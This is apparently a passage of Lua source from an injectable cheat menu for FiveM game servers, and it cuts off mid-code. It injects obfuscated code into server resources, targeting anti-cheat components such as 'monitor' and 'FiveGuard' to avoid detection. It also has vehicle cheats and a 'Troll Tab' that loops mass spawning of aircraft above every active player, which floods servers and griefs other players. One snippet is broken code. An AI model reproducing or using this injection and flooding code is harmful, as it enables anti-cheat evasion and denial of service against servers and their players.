MachoMenuButton(VehicleTabSections[2], "Repair Vehicle", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
        local function FgN7LqxZyP()
            local aBcD = PlayerPedId
            local eFgH = GetVehiclePedIsIn
            local iJkL = SetVehicleFixed
            local mNoP = SetVehicleDeformationFixed

            local p = aBcD()
            local v = eFgH(p, false)
            if v and v ~= 0 then
                iJkL(v)
                mNoP(v)
            end
        end

        FgN7LqxZyP()
    ]])
end)

MachoMenuButton(VehicleTabSections[2], "Flip Vehicle", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
        local function vXmYLT9pq2()
            local a = PlayerPedId
            local b = GetVehiclePedIsIn
            local c = GetEntityHeading
            local d = SetEntityRotation

            local ped = a()
            local veh = b(ped, false)
            if veh and veh ~= 0 then
                d(veh, 0.0, 0.0, c(veh))
            end
        end

        vXmYLT9pq2()
    ]])
end)

MachoMenuButton(VehicleTabSections[2], "Clean Vehicle", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
        local function qPwRYKz7mL()
            local a = PlayerPedId
            local b = GetVehiclePedIsIn
            local c = SetVehicleDirtLevel

            local ped = a()
            local veh = b(ped, false)
            if veh and veh ~= 0 then
                c(veh, 0.0)
            end
        end

        qPwRYKz7mL()
    ]])
end)

MachoMenuButton(VehicleTabSections[2], "Delete Vehicle", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
        local function LXpTqWvR80()
            local aQw = PlayerPedId
            local bEr = GetVehiclePedIsIn
            local cTy = DoesEntityExist
            local dUi = NetworkHasControlOfEntity
            local eOp = SetEntityAsMissionEntity
            local fAs = DeleteEntity
            local gDf = DeleteVehicle
            local hJk = SetVehicleHasBeenOwnedByPlayer

            local ped = aQw()
            local veh = bEr(ped, false)

            if veh and veh ~= 0 and cTy(veh) then
                hJk(veh, true)
                eOp(veh, true, true)

                if dUi(veh) then
                    fAs(veh)
                    gDf(veh)
                end
            end

        end

        LXpTqWvR80()
    ]])
end)

MachoMenuButton(VehicleTabSections[2], "Toggle Vehicle Engine", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
        local function NKzqVoXYLm()
            local a = PlayerPedId
            local b = GetVehiclePedIsIn
            local c = GetIsVehicleEngineRunning
            local d = SetVehicleEngineOn

            local ped = a()
            local veh = b(ped, false)
            if veh and veh ~= 0 then
                if c(veh) then
                    d(veh, false, true, true)
                else
                    d(veh, true, true, false)
                end
            end
        end

        NKzqVoXYLm()
    ]])
end)

MachoMenuButton(VehicleTabSections[2], "Max Vehicle Upgrades", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
        local function XzPmLqRnWyBtVkGhQe()
            local FnUhIpOyLkTrEzSd = PlayerPedId
            local VmBgTnQpLcZaWdEx = GetVehiclePedIsIn
            local RfDsHuNjMaLpOyBt = SetVehicleModKit
            local AqWsEdRzXcVtBnMa = SetVehicleWheelType
            local TyUiOpAsDfGhJkLz = GetNumVehicleMods
            local QwErTyUiOpAsDfGh = SetVehicleMod
            local ZxCvBnMqWeRtYuIo = ToggleVehicleMod
            local MnBvCxZaSdFgHjKl = SetVehicleWindowTint
            local LkJhGfDsQaZwXeCr = SetVehicleTyresCanBurst
            local UjMiKoLpNwAzSdFg = SetVehicleExtra
            local RvTgYhNuMjIkLoPb = DoesExtraExist

            local lzQwXcVeTrBnMkOj = FnUhIpOyLkTrEzSd()
            local jwErTyUiOpMzNaLk = VmBgTnQpLcZaWdEx(lzQwXcVeTrBnMkOj, false)
            if not jwErTyUiOpMzNaLk or jwErTyUiOpMzNaLk == 0 then return end

            RfDsHuNjMaLpOyBt(jwErTyUiOpMzNaLk, 0)
            AqWsEdRzXcVtBnMa(jwErTyUiOpMzNaLk, 7)

            for XyZoPqRtWnEsDfGh = 0, 16 do
                local uYtReWqAzXsDcVf = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh)
                if uYtReWqAzXsDcVf and uYtReWqAzXsDcVf > 0 then
                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh, uYtReWqAzXsDcVf - 1, false)
                end
            end

            QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 14, 16, false)

            local aSxDcFgHiJuKoLpM = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, 15)
            if aSxDcFgHiJuKoLpM and aSxDcFgHiJuKoLpM > 1 then
                QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 15, aSxDcFgHiJuKoLpM - 2, false)
            end

            for QeTrBnMkOjHuYgFv = 17, 22 do
                ZxCvBnMqWeRtYuIo(jwErTyUiOpMzNaLk, QeTrBnMkOjHuYgFv, true)
            end

            QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 23, 1, false)
            QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 24, 1, false)

            for TpYuIoPlMnBvCxZq = 1, 12 do
                if RvTgYhNuMjIkLoPb(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq) then
                    UjMiKoLpNwAzSdFg(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq, false)
                end
            end

            MnBvCxZaSdFgHjKl(jwErTyUiOpMzNaLk, 1)
            LkJhGfDsQaZwXeCr(jwErTyUiOpMzNaLk, false)
        end

        XzPmLqRnWyBtVkGhQe()
    ]])
end)

MachoMenuButton(VehicleTabSections[2], "Set Nitrous", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
        local function nitro()
        SetNitrousIsActive(vehicle, true)
        SetVehicleNitroEnabled(veh, true)
    ]])
end)

MachoMenuButton(VehicleTabSections[2], "Teleport into Closest Vehicle", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
        local function uPKcoBaEHmnK()
            local ziCFzHyzxaLX = SetPedIntoVehicle
            local YPPvDlOGBghA = GetClosestVehicle

            local Coords = GetEntityCoords(PlayerPedId())
            local vehicle = YPPvDlOGBghA(Coords.x, Coords.y, Coords.z, 15.0, 0, 70)

            if DoesEntityExist(vehicle) and not IsPedInAnyVehicle(PlayerPedId(), false) then
                if GetPedInVehicleSeat(vehicle, -1) == 0 then
                    ziCFzHyzxaLX(PlayerPedId(), vehicle, -1)
                else
                    ziCFzHyzxaLX(PlayerPedId(), vehicle, 0)
                end
            end
        end

        uPKcoBaEHmnK()
    ]])
end)

MachoMenuButton(VehicleTabSections[2], "Unlock Closest Vehicle", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
        local function TpLMqKtXwZ()
            local AsoYuTrBnMvCxZaQw = PlayerPedId
            local GhrTnLpKjUyVbMnZx = GetEntityCoords
            local UyeWsDcXzQvBnMaLp = GetClosestVehicle
            local ZmkLpQwErTyUiOpAs = DoesEntityExist
            local VczNmLoJhBgVfCdEx = SetEntityAsMissionEntity
            local EqWoXyBkVsNzQuH = SetVehicleDoorsLocked
            local YxZwQvTrBnMaSdFgHj = SetVehicleDoorsLockedForAllPlayers
            local RtYuIoPlMnBvCxZaSd = SetVehicleHasBeenOwnedByPlayer
            local LkJhGfDsAzXwCeVrBt = NetworkHasControlOfEntity

            local ped = AsoYuTrBnMvCxZaQw()
            local coords = GhrTnLpKjUyVbMnZx(ped)
            local veh = UyeWsDcXzQvBnMaLp(coords.x, coords.y, coords.z, 10.0, 0, 70)

            if veh and ZmkLpQwErTyUiOpAs(veh) and LkJhGfDsAzXwCeVrBt(veh) then
                VczNmLoJhBgVfCdEx(veh, true, true)
                RtYuIoPlMnBvCxZaSd(veh, true)
                EqWoXyBkVsNzQuH(veh, 1)
                YxZwQvTrBnMaSdFgHj(veh, false)
            end

        end

        TpLMqKtXwZ()
    ]])
end)

MachoMenuButton(VehicleTabSections[2], "Lock Closest Vehicle", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
        local function tRYpZvKLxQ()
            local WqEoXyBkVsNzQuH = PlayerPedId
            local LoKjBtWxFhPoZuR = GetEntityCoords
            local VbNmAsDfGhJkLzXcVb = GetClosestVehicle
            local TyUiOpAsDfGhJkLzXc = DoesEntityExist
            local PlMnBvCxZaSdFgTrEq = SetEntityAsMissionEntity
            local KjBtWxFhPoZuRZlK = SetVehicleHasBeenOwnedByPlayer
            local AsDfGhJkLzXcVbNmQwE = SetVehicleDoorsLocked
            local QwEoXyBkVsNzQuHL = SetVehicleDoorsLockedForAllPlayers
            local ZxCvBnMaSdFgTrEqWz = NetworkHasControlOfEntity

            local ped = WqEoXyBkVsNzQuH()
            local coords = LoKjBtWxFhPoZuR(ped)
            local veh = VbNmAsDfGhJkLzXcVb(coords.x, coords.y, coords.z, 10.0, 0, 70)

            if veh and TyUiOpAsDfGhJkLzXc(veh) and ZxCvBnMaSdFgTrEqWz(veh) then
                PlMnBvCxZaSdFgTrEq(veh, true, true)
                KjBtWxFhPoZuRZlK(veh, true)
                AsDfGhJkLzXcVbNmQwE(veh, 2)
                QwEoXyBkVsNzQuHL(veh, true)
            end
        end

        tRYpZvKLxQ()
    ]])
end)

MachoMenuText(VehicleTabSections[2], "For Fun!")

MachoMenuCheckbox(VehicleTabSections[2], "Fly Mode", 
    function() 
        _G.EngkantoFly = true
        MachoMenuNotification("Vehicle Fly", "ENABLED: Press Y=select, Hold E=fly")

        Citizen.CreateThread(function()
            while _G.EngkantoFly do
                Citizen.Wait(0)

                if IsControlJustPressed(0, 246) then 
                    if selectedVehicle and DoesEntityExist(selectedVehicle) then
                        SetEntityDrawOutline(selectedVehicle, false)
                    end

                    local ped = PlayerPedId()
                    local coords = GetEntityCoords(ped)
                    selectedVehicle = GetClosestVehicle(coords.x, coords.y, coords.z, 50.0, 0, 70)

                    if selectedVehicle and DoesEntityExist(selectedVehicle) then
                        SetEntityDrawOutline(selectedVehicle, true)
                        SetEntityDrawOutlineColor(0, 255, 255, 255)
                        MachoMenuNotification("Vehicle Fly", "Vehicle Selected!")
                    end
                end

                if selectedVehicle and DoesEntityExist(selectedVehicle) then
                    if IsControlPressed(0, 38) then
                        if not isVehicleFlying then
                            isVehicleFlying = true
                            SetEntityHasGravity(selectedVehicle, false)
                        end

                        local camRot = GetGameplayCamRot(2)
                        SetEntityRotation(selectedVehicle, camRot.x, camRot.y, camRot.z, 2, true)

                        local speed = 50.0
                        local dirX = -math.sin(math.rad(camRot.z)) * math.cos(math.rad(camRot.x))
                        local dirY = math.cos(math.rad(camRot.z)) * math.cos(math.rad(camRot.x))
                        local dirZ = math.sin(math.rad(camRot.x))

                        SetEntityVelocity(selectedVehicle, dirX * speed, dirY * speed, dirZ * speed)
                    else
                        if isVehicleFlying then
                            isVehicleFlying = false
                            SetEntityHasGravity(selectedVehicle, true)
                        end
                    end
                end
            end

            if selectedVehicle and DoesEntityExist(selectedVehicle) then
                SetEntityDrawOutline(selectedVehicle, false)
                SetEntityHasGravity(selectedVehicle, true)
            end
            selectedVehicle = nil
        end)
    end,
    function() 
        _G.EngkantoFly = false
        MachoMenuNotification("Vehicle Fly", "DISABLED")
    end
)

MachoMenuButton(VehicleTabSections[2], "SuperHop Vehicle", function()
    local selectedVeh = MachoMenuGetSelectedVehicle() or 0
    
    MachoInjectResource2(3, "any", string.format([[
        local selVeh = %d
        local ped = PlayerPedId()
        local vehicle = (selVeh ~= 0 and DoesEntityExist(selVeh)) and selVeh or GetVehiclePedIsIn(ped, false)

        if vehicle ~= 0 and DoesEntityExist(vehicle) then
            NetworkRequestControlOfEntity(vehicle)
            
            local vel = GetEntityVelocity(vehicle)
            
            SetEntityVelocity(vehicle, vel.x, vel.y, 1000.0)
        end
    ]], selectedVeh))
end)

MachoMenuButton(VehicleTabSections[2], "Vehicle Backflip", function()
    MachoInjectResource(
        CheckResource("monitor") and "monitor"
        or CheckResource("oxmysql") and "oxmysql"
        or "any",
    [[
        local veh = GetVehiclePedIsIn(PlayerPedId(), false)
        if veh ~= 0 then
            ApplyForceToEntity(veh, 1, 0.0, 0.0, 8.5, 0.0, 0.0, 0.0, 0, true, true, true, false, true)

            ApplyForceToEntity(veh, 1, 0.0, 0.0, 6.5, 0.0, 3.7, 0.0, 0, true, true, true, false, true)
        end
    ]]
    )
end)

MachoMenuButton(VehicleTabSections[2], "Vehicle Kickflip [Left]", function()
    MachoInjectResource(
        CheckResource("monitor") and "monitor"
        or CheckResource("oxmysql") and "oxmysql"
        or "any",
    [[
        local veh = GetVehiclePedIsIn(PlayerPedId(), false)
        if veh ~= 0 then

            ApplyForceToEntity(veh, 1, 0.0, 0.0, 7.0, 0.0, 0.0, 0.0, 0, true, true, true, false, true)

            ApplyForceToEntity(veh, 1, 0.0, 0.0, 3.5, 3.8, 0.0, 0.0, 0, true, true, true, false, true)
        end
    ]]
    )
end)

MachoMenuButton(VehicleTabSections[2], "Vehicle Kickflip [Right]", function()
    MachoInjectResource(
        CheckResource("monitor") and "monitor"
        or CheckResource("oxmysql") and "oxmysql"
        or "any",
    [[
        local veh = GetVehiclePedIsIn(PlayerPedId(), false)
        if veh ~= 0 then

            ApplyForceToEntity(veh, 1, 0.0, 0.0, 7.0, 0.0, 0.0, 0.0, 0, true, true, true, false, true)

            ApplyForceToEntity(veh, 1, 0.0, 0.0, 3.5, -3.8, 0.0, 0.0, 0, true, true, true, false, true)
        end
    ]]
    )
end)

MachoMenuText(VehicleTabSections[2], "Customize")

MachoMenuSlider(VehicleTabSections[2], "Primary Red", 0, 0, 255, "", 0, function(value)
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", string.format([[
        local ped = PlayerPedId()
        local veh = GetVehiclePedIsIn(ped, false)
        if veh ~= 0 then
            local r,g,b = GetVehicleCustomPrimaryColour(veh)
            SetVehicleCustomPrimaryColour(veh, %d, g, b)
        end
    ]], value))
end)

MachoMenuSlider(VehicleTabSections[2], "Primary Green", 0, 0, 255, "", 0, function(value)
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", string.format([[
        local ped = PlayerPedId()
        local veh = GetVehiclePedIsIn(ped, false)
        if veh ~= 0 then
            local r,g,b = GetVehicleCustomPrimaryColour(veh)
            SetVehicleCustomPrimaryColour(veh, r, %d, b)
        end
    ]], value))
end)

MachoMenuSlider(VehicleTabSections[2], "Primary Blue", 0, 0, 255, "", 0, function(value)
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", string.format([[
        local ped = PlayerPedId()
        local veh = GetVehiclePedIsIn(ped, false)
        if veh ~= 0 then
            local r,g,b = GetVehicleCustomPrimaryColour(veh)
            SetVehicleCustomPrimaryColour(veh, r, g, %d)
        end
    ]], value))
end)

-- SECONDARY

MachoMenuSlider(VehicleTabSections[2], "Secondary Red", 0, 0, 255, "", 0, function(value)
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", string.format([[
        local ped = PlayerPedId()
        local veh = GetVehiclePedIsIn(ped, false)
        if veh ~= 0 then
            local r,g,b = GetVehicleCustomSecondaryColour(veh)
            SetVehicleCustomSecondaryColour(veh, %d, g, b)
        end
    ]], value))
end)

MachoMenuSlider(VehicleTabSections[2], "Secondary Green", 0, 0, 255, "", 0, function(value)
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", string.format([[
        local ped = PlayerPedId()
        local veh = GetVehiclePedIsIn(ped, false)
        if veh ~= 0 then
            local r,g,b = GetVehicleCustomSecondaryColour(veh)
            SetVehicleCustomSecondaryColour(veh, r, %d, b)
        end
    ]], value))
end)

MachoMenuSlider(VehicleTabSections[2], "Secondary Blue", 0, 0, 255, "", 0, function(value)
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", string.format([[
        local ped = PlayerPedId()
        local veh = GetVehiclePedIsIn(ped, false)
        if veh ~= 0 then
            local r,g,b = GetVehicleCustomSecondaryColour(veh)
            SetVehicleCustomSecondaryColour(veh, r, g, %d)
        end
    ]], value))
end)

local function FastCycle(modID)
    local v = GetVehiclePedIsIn(PlayerPedId(), false)
    if v ~= 0 then
        MachoInjectResource2(3, "any", [[
            local v = GetVehiclePedIsIn(PlayerPedId(), false)
            local id = ]] .. modID .. [[
            if v ~= 0 then
                SetVehicleModKit(v, 0)
                local cur = GetVehicleMod(v, id)
                local max = GetNumVehicleMods(v, id) - 1
                local next = cur + 1
                if next > max then next = -1 end
                SetVehicleMod(v, id, next, false)
            end
        ]])
    else
        MachoMenuNotification("Engkanto Menu", "WALA KA SA KOTSE BOBO")
    end
end

MachoMenuButton(VehicleTabSections[2], "Spoiler", function() FastCycle(0) end)
MachoMenuButton(VehicleTabSections[2], "Front Bumper", function() FastCycle(1) end)
MachoMenuButton(VehicleTabSections[2], "Rear Bumper", function() FastCycle(2) end)
MachoMenuButton(VehicleTabSections[2], "Skirts", function() FastCycle(3) end)
MachoMenuButton(VehicleTabSections[2], "Exhaust", function() FastCycle(4) end)
MachoMenuButton(VehicleTabSections[2], "Grille", function() FastCycle(6) end)
MachoMenuButton(VehicleTabSections[2], "Hood", function() FastCycle(7) end)
MachoMenuButton(VehicleTabSections[2], "Fenders", function() FastCycle(8) end)
MachoMenuButton(VehicleTabSections[2], "Roof", function() FastCycle(10) end)


MachoMenuText(VehicleTabSections[2], "Mags")

local SportWheels = {"Inferno", "Deep Five", "LozSpeed Ten", "Diamond Cut", "Chrono", "Feroci RR", "Fifty Nine", "Mercie CH", "Synthetic Z", "Organic Type", "Endo v.1", "Giga Mesh", "GT One", "Slicer", "Spindizzy"}
local MuscleWheels = {"Classic Five", "Dukes", "Muscle Freak", "Kracka", "Spooner", "Old School", "El Jefe", "Dodman", "Six Seven", "Fairlie", "Big Mamma", "Steelies", "Prima Donna", "Sovereign"}
local LowriderWheels = {"Flare", "Wired", "Gold-Tooth", "Triple-Golds", "Big Worm", "Seven-Fives", "V-Slot", "Custom Twist", "Classic Twist", "Dollar", "Big Dog", "Lowfive", "Knuckle"}
local SUVWheels = {"VIP", "Benefactor", "Cosmo", "Bippu", "Royal Tip", "Supe R", "Cotrina", "Sheriff", "Force", "Viper", "Mega-Wheel", "Granite"}
local OffroadWheels = {"Raider", "Mudslinger", "Marsh", "Dune Basher", "Freeway", "Rugged", "Sultan", "Mil Spec", "Rock Crawler", "Heavy Duty"}
local TunerWheels = {"Cosmo", "Super Mesh", "Outsider", "Rollas", "Driftmaster", "Chokador", "Konig", "Fujiwara", "Zokusha", "Battle VIII", "Rally Master"}
local HighEndWheels = {"Shadow", "Hyper", "Blade", "Diamond", "Supra", "Carbon Solar", "Cheetah RR", "Solar", "Split Six", "Dash VIP", "LozSpeed Viper"}
local BennysBespoke = {"Benedict", "Clean", "Lamar Special", "Tiger Style", "Gilded", "Knock-Offs", "Spit Five", "Solid Face", "Dished Eight", "Deep Dish", "60-Spoke", "Laced"}

local WheelColorNames = {"Black", "Carbon Black", "Graphite", "Anthracite", "Black Steel", "Dark Steel", "Silver", "Blue Silver", "Rolled Steel", "Shadow Silver", "Stone Silver", "Midnight Silver", "Cast Iron", "Red", "Torino Red", "Formula Red", "Lava Red", "Blaze Red", "Grace Red", "Garnet Red", "Sunset Orange", "Gold", "Pure Gold", "Bronze"}
local WheelColorIDs = {0, 147, 104, 105, 3, 4, 112, 127, 11, 8, 9, 10, 15, 27, 28, 29, 150, 151, 152, 153, 31, 37, 158, 154}

local function InstantWheel(wType, wIndex)
    local veh = MachoMenuGetSelectedVehicle() or 0
    MachoInjectResource2(3, "any", string.format([[
        local v = (%d ~= 0 and DoesEntityExist(%d)) and %d or GetVehiclePedIsIn(PlayerPedId(), false)
        if v ~= 0 then
            SetVehicleModKit(v, 0)
            SetVehicleWheelType(v, %d)
            SetVehicleMod(v, 23, %d, false)
            if GetVehicleClass(v) == 8 then SetVehicleMod(v, 24, %d, false) end
        end
    ]], veh, veh, veh, wType, wIndex, wIndex))
end

local function InstantColor(colorID)
    local veh = MachoMenuGetSelectedVehicle() or 0
    MachoInjectResource2(3, "any", string.format([[
        local v = (%d ~= 0 and DoesEntityExist(%d)) and %d or GetVehiclePedIsIn(PlayerPedId(), false)
        if v ~= 0 then
            local p, s = GetVehicleColours(v) 
            local pearcent, wheelc = GetVehicleExtraColours(v)
            SetVehicleExtraColours(v, pearcent, %d)
        end
    ]], veh, veh, veh, colorID))
end

MachoMenuDropDown(VehicleTabSections[2], "Sport Wheels", function(Index) InstantWheel(0, Index) end, table.unpack(SportWheels))
MachoMenuDropDown(VehicleTabSections[2], "Muscle Wheels", function(Index) InstantWheel(1, Index) end, table.unpack(MuscleWheels))
MachoMenuDropDown(VehicleTabSections[2], "Lowrider Wheels", function(Index) InstantWheel(2, Index) end, table.unpack(LowriderWheels))
MachoMenuDropDown(VehicleTabSections[2], "SUV Wheels", function(Index) InstantWheel(3, Index) end, table.unpack(SUVWheels))
MachoMenuDropDown(VehicleTabSections[2], "Offroad Wheels", function(Index) InstantWheel(4, Index) end, table.unpack(OffroadWheels))
MachoMenuDropDown(VehicleTabSections[2], "Tuner Wheels", function(Index) InstantWheel(5, Index) end, table.unpack(TunerWheels))
MachoMenuDropDown(VehicleTabSections[2], "High End Wheels", function(Index) InstantWheel(7, Index) end, table.unpack(HighEndWheels))
MachoMenuDropDown(VehicleTabSections[2], "Benny's Bespoke", function(Index) InstantWheel(9, Index) end, table.unpack(BennysBespoke))

MachoMenuDropDown(VehicleTabSections[2], "Wheel Color", function(Index)
    InstantColor(WheelColorIDs[Index + 1])
end, table.unpack(WheelColorNames))

local TireOptions = {"Standard Tires", "Custom Tires"}
MachoMenuDropDown(VehicleTabSections[2], "Tire Design", function(Index)
    local veh = MachoMenuGetSelectedVehicle() or 0
    local isCustom = (Index == 1) 
    MachoInjectResource2(3, "any", string.format([[
        local v = (%d ~= 0 and DoesEntityExist(%d)) and %d or GetVehiclePedIsIn(PlayerPedId(), false)
        if v ~= 0 then
            local currentMod = GetVehicleMod(v, 23)
            SetVehicleMod(v, 23, currentMod, %s)
            if GetVehicleClass(v) == 8 then SetVehicleMod(v, 24, currentMod, %s) end
        end
    ]], veh, veh, veh, tostring(isCustom), tostring(isCustom)))
end, table.unpack(TireOptions))

-- Troll Tab
MachoMenuButton(ServerTabSections[1], "Small Airplane", function()
    local InjectRes = GetInjectResource()
    if not InjectRes then return end
     MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
local vehicleModel = "stunt"
local spawnInterval = 2000
local maxVehiclesPerPlayer = 15
local batchSize = 20

function LoadVehicleModel(model)
    local hash = GetHashKey(model)
    RequestModel(hash)
    while not HasModelLoaded(hash) do
        Citizen.Wait(50)
    end
    return hash
end

function SpawnVehiclesForPlayer(playerId, modelHash)
    local ped = GetPlayerPed(playerId)
    if not DoesEntityExist(ped) then return end
    local pos = GetEntityCoords(ped)
    local heading = GetEntityHeading(ped)
    local spawned = 0

    while spawned < maxVehiclesPerPlayer do
        for i = 1, batchSize do
            if spawned >= maxVehiclesPerPlayer then break end
            local offsetX = math.random(-10, 10)
            local offsetY = math.random(-10, 10)
            local spawnZ = pos.z + math.random(30,50)

            local vehicle = CreateVehicle(modelHash, pos.x + offsetX, pos.y + offsetY, spawnZ, heading, true, false)
            if DoesEntityExist(vehicle) then
                SetVehicleEngineOn(vehicle, true, true, false)
                SetEntityAsNoLongerNeeded(vehicle)
            end
            spawned = spawned + 1
        end
        Citizen.Wait(50)
    end
end

Citizen.CreateThread(function()
    local modelHash = LoadVehicleModel(vehicleModel)
    while true do
        for _, playerId in ipairs(GetActivePlayers()) do
            Citizen.CreateThread(function()
                SpawnVehiclesForPlayer(playerId, modelHash)
            end)
        end
        Citizen.Wait(spawnInterval)
    end
end)
    ]])
end)

MachoMenuButton(ServerTabSections[1], "Luxor Airplane", function()
    local InjectRes = GetInjectResource()
    if not InjectRes then return end
     MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
local vehicleModel = "luxor"
local spawnInterval = 2000
local maxVehiclesPerPlayer = 15
local batchSize = 20

function LoadVehicleModel(model)
    local hash = GetHashKey(model)
    RequestModel(hash)
    while not HasModelLoaded(hash) do
        Citizen.Wait(50)
    end
    return hash
end

function SpawnVehiclesForPlayer(playerId, modelHash)
    local ped = GetPlayerPed(playerId)
    if not DoesEntityExist(ped) then return end
    local pos = GetEntityCoords(ped)
    local heading = GetEntityHeading(ped)
    local spawned = 0

    while spawned < maxVehiclesPerPlayer do
        for i = 1, batchSize do
            if spawned >= maxVehiclesPerPlayer then break end
            local offsetX = math.random(-10, 10)
            local offsetY = math.random(-10, 10)
            local spawnZ = pos.z + math.random(30,50)

            local vehicle = CreateVehicle(modelHash, pos.x + offsetX, pos.y + offsetY, spawnZ, heading, true, false)
            if DoesEntityExist(vehicle) then
                SetVehicleEngineOn(vehicle, true, true, false)
                SetEntityAsNoLongerNeeded(vehicle)
            end
            spawned = spawned + 1
        end
        Citizen.Wait(50)
    end
end

Citizen.CreateThread(function()
    local modelHash = LoadVehicleModel(vehicleModel)
    while true do
        for _, playerId in ipairs(GetActivePlayers()) do
            Citizen.CreateThread(function()
                SpawnVehiclesForPlayer(playerId, modelHash)
            end)
        end
        Citizen.Wait(spawnInterval)
    end
end)
    ]])
end)

MachoMenuButton(ServerTabSections[1], "Cargo Plane", function()
    local InjectRes = GetInjectResource()
    if not InjectRes then return end
     MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
local vehicleModel = "cargoplane"
local spawnInterval = 2000
local maxVehiclesPerPlayer = 15
local batchSize = 20

function LoadVehicleModel(model)
    local hash = GetHashKey(model)
    RequestModel(hash)
    while not HasModelLoaded(hash) do
        Citizen.Wait(50)
    end
    return hash
end

function SpawnVehiclesForPlayer(playerId, modelHash)
    local ped = GetPlayerPed(playerId)
    if not DoesEntityExist(ped) then return end
    local pos = GetEntityCoords(ped)
    local heading = GetEntityHeading(ped)
    local spawned = 0

    while spawned < maxVehiclesPerPlayer do
        for i = 1, batchSize do
            if spawned >= maxVehiclesPerPlayer then break end
            local offsetX = math.random(-10, 10)
            local offsetY = math.random(-10, 10)
            local spawnZ = pos.z + math.random(30, 60)

            local vehicle = CreateVehicle(modelHash, pos.x + offsetX, pos.y + offsetY, spawnZ, heading, true, false)
            if DoesEntityExist(vehicle) then
                SetVehicleEngineOn(vehicle, true, true, false)
                SetEntityAsNoLongerNeeded(vehicle)
            end
            spawned = spawned + 1
        end
        Citizen.Wait(50)
    end
end

Citizen.CreateThread(function()
    local modelHash = LoadVehicleModel(vehicleModel)
    while true do
        for _, playerId in ipairs(GetActivePlayers()) do
            Citizen.CreateThread(function()
                SpawnVehiclesForPlayer(playerId, modelHash)
            end)
        end
        Citizen.Wait(spawnInterval)
    end
end)
    ]])
end)

MachoMenuButton(ServerTabSections[1], "Mammatus Plane", function()
    local InjectRes = GetInjectResource()
    if not InjectRes then return end
     MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
local vehicleModel = "mammatus"
local spawnInterval = 2000
local maxVehiclesPerPlayer = 15
local batchSize = 20

function LoadVehicleModel(model)
    local hash = GetHashKey(model)
    RequestModel(hash)
    while not HasModelLoaded(hash) do
        Citizen.Wait(50)
    end
    return hash
end

function SpawnVehiclesForPlayer(playerId, modelHash)
    local ped = GetPlayerPed(playerId)
    if not DoesEntityExist(ped) then return end
    local pos = GetEntityCoords(ped)
    local heading = GetEntityHeading(ped)
    local spawned = 0

    while spawned < maxVehiclesPerPlayer do
        for i = 1, batchSize do
            if spawned >= maxVehiclesPerPlayer then break end
            local offsetX = math.random(-10, 10)
            local offsetY = math.random(-10, 10)
            local spawnZ = pos.z + math.random(30, 60)

            local vehicle = CreateVehicle(modelHash, pos.x + offsetX, pos.y + offsetY, spawnZ, heading, true, false)
            if DoesEntityExist(vehicle) then
                SetVehicleEngineOn(vehicle, true, true, false)
                SetEntityAsNoLongerNeeded(vehicle)
            end
            spawned = spawned + 1
        end
        Citizen.Wait(50)
    end
end

Citizen.CreateThread(function()
    local modelHash = LoadVehicleModel(vehicleModel)
    while true do
        for _, playerId in ipairs(GetActivePlayers()) do
            Citizen.CreateThread(function()
                SpawnVehiclesForPlayer(playerId, modelHash)
            end)
        end
        Citizen.Wait(spawnInterval)
    end
end)
    ]])
end)

MachoMenuButton(ServerTabSections[1], "Franklin Shamal Planes", function()
    local InjectRes = GetInjectResource()
    if not InjectRes then return end
   MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[

local vehicleModel = "shamal"
local spawnInterval = 2000
local maxVehiclesPerPlayer = 15
local batchSize = 20

function LoadVehicleModel(model)
    local hash = GetHashKey(model)
    RequestModel(hash)
    while not HasModelLoaded(hash) do
        Citizen.Wait(50)
    end
    return hash
end

function SpawnVehiclesForPlayer(playerId, modelHash)
    local ped = GetPlayerPed(playerId)
    if not DoesEntityExist(ped) then return end
    local pos = GetEntityCoords(ped)
    local heading = GetEntityHeading(ped)
    local spawned = 0

    while spawned < maxVehiclesPerPlayer do
        for i = 1, batchSize do
